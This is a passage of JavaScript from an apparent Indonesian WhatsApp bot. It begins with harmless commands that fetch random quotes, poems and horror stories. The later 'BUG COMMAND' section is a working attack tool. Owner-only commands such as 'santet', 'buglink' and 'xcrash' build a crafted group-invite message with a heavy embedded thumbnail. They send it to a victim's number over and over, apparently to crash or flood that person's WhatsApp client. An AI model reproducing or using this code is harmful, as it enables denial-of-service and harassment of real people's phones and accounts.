case 'katasindiran': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const sindiran = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/katasindiran.json`)
const katasindiran = await pickRandom(sindiran)
m.reply(`${katasindiran}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cekkodam': case 'cekkhodam': {
if (!text) return m.reply("mana nama mu yang mo di cek??🗿🥸")
const khodam = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/khodam.json`)
const khodamu = await pickRandom(khodam)
const katakodam = await pickRandom(["awiokwoik 🤣 🗿 🐦","brakakakak khodam mu apaan kek gitu :v","😂😂bu mega ketawa melihat ini","😞ututututu kaciann","😨ati atii cokk khodam nya ngeri","ishh ishhh memalukann🗿","sekopsekopsekop😂","pengen dosa takut ketawa😂🗿","sehat sehat yakk adick adick😂🐦","ututututu🤣🗿"])
bales(`Khodam ${text} adalah *${khodamu}*\n\n${katakodam}`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'quotesislamic': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const islamic = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/quotesislamic.json`)
const quotesislamic = await pickRandom(islamic)
m.reply(`${quotesislamic}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'faktaunik': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const fakta = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/faktaunix.json`)
const faktaunik = await pickRandom(fakta)
m.reply(`*Taukah Kamu?*\n\n${faktaunik}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'katasenja': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const senja = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/katasenja.json`)
const katasenja = await pickRandom(senja)
m.reply(`${katasenja}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'katailham': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const ilham = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/katailham.json`)
const katailham = await pickRandom(ilham)
m.reply(`${katailham}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ceritahoror': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const horor = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/ceritahoror.json`)
const ceritahoror = await pickRandom(horor)
await vreden.sendMessage(m.chat, {
text: `*${ceritahoror.judul}*\n\nDesk:\n${ceritahoror.desc}\n\nStory:\n${ceritahoror.story}`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {  
title: ceritahoror.judul,
body: 'WhatsApp Bot Cerpen',
thumbnailUrl: ceritahoror.thumb,
sourceUrl: tiktokk,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'quotes': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const quot = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/quotes.json`)
const quote = await pickRandom(quot)
m.reply(`${quote.quotes}\n\nBy ${quote.author}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'puisi': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const puis = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/${command}.json`)
const puisi = await pickRandom(puis)
m.reply(`${puisi}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'pantun': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const pant = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/${command}.json`)
const pantun = await pickRandom(pant)
m.reply(`${pantun}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'motivasi': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const motiv = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-text/main/${command}.json`)
const motivasi = await pickRandom(motiv)
m.reply(`${motivasi}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
//▢━━━━━━━━━━━━━━「 BUG COMMAND 」━━━━━━━━━━━━━━▢
case 'bugs': {
if (!isCreator) return tolakk(mess.OnlyOwner)
Pe = m.chat
if (ownerNumber.includes(Pe)) return warning('Tidak Dapat Melakukannya Kepada Owner')
var groupInvite = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "6288239620884-1626256984@g.us",
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": "166659839399999",
"groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️${ngazap(prefix)}`,
"jpegThumbnail": "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",
"caption": `${command}\n*https://wa.me/settings*\n${botName} ${ngazap(prefix)}`,
}
}), { userJid: Pe, quoted: m })
if (args.length == 0) return warning(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
      case "xvir":
      case 'xstik':
      case "xlist":
      case "xbutton":
      case "x24j":
      case "xuia":
      case "xlec":
      case "xforce":
      case "xva":
      case "xta":
      case "xcrash":
      case "xbom":
      case "xbug":
      case "xkill":
      case "xloc":
      case "xdoc":
      case 'xhit': {
      if (!isCreator) return tolakk(mess.OnlyOwner)
let good = text.split(',');
if (good.length < 2) return m.reply(`*Masukan Input Dengan Benar!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
if (isNaN(good[0])) return warning(`*Nomor Harus Berupa Angka!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
if (!good[0]) return warning(`*Masukan Nombor!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
if (!good[1]) return warning(`*Masukan Jumlah Yang Dikirim!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
if (isNaN(good[1])) return warning(`*Jumlah Bug Harus Berupa Angka!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
let onlen = await vreden.onWhatsApp(good[0])
if (onlen.length == 0) return m.reply('*Nomor Tersebut Tidak Ada Di WhatsApp!*')
m.reply(`*[ </> ]* Mengirimkan ${command}...`)
await sleep(1000)
vredbug(onlen[0].jid, good[1])
await sleep(2000)
m.reply(`*[ </> ]* Done sent!`)
      }
      db.data.users[m.sender].exp += await randomNomor(20)
break
case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': case 'buglink': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!args[0]) return warning(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
Pe = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (ownerNumber.includes(Pe)) return warning('Tidak Dapat Melakukannya Kepada Owner')
var groupInvite = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "6288239620884-1626256984@g.us",
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": "166659839399999",
"groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️${ngazap(prefix)}`,
"jpegThumbnail": "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",
"caption": `${command}\n*https://wa.me/settings*\n${botName} ${ngazap(prefix)}`,
}
}), { userJid: Pe, quoted: m })
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
vreden.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(2000)
